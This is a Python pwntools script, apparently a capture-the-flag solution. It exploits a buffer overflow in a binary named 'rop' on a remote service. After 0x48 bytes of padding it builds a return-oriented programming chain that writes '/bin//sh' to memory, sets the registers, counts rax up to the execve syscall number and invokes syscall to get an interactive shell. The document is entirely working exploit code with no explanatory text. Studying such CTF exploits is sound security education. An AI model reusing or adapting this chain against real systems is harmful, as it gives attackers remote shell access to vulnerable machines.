from pwn import *

p = process("./rop")
p = remote("forever.isss.io", 1306)

payload = b"A"*0x48

payload += p64(0x40f48e) # pop rsi ; ret
payload += p64(0x4c00e0) # @ .data
payload += p64(0x4518c7) # pop rax ; ret
payload += b'/bin//sh'
payload += p64(0x481be5) # mov qword ptr [rsi], rax ; ret
payload += p64(0x40f48e) # pop rsi ; ret
payload += p64(0x4c00e8) # @ .data + 8
payload += p64(0x4466d9) # xor rax, rax ; ret
payload += p64(0x481be5) # mov qword ptr [rsi], rax ; ret
payload += p64(0x4018ca) # pop rdi ; ret
payload += p64(0x4c00e0) # @ .data
payload += p64(0x40f48e) # pop rsi ; ret
payload += p64(0x4c00e8) # @ .data + 8
payload += p64(0x4017cf) # pop rdx ; ret
payload += p64(0x4c00e8) # @ .data + 8
payload += p64(0x4466d9) # xor rax, rax ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x477250) # add rax, 1 ; ret
payload += p64(0x4012d3) # syscall

p.recvuntil(b"whats ur name")
p.sendline(payload)

p.interactive()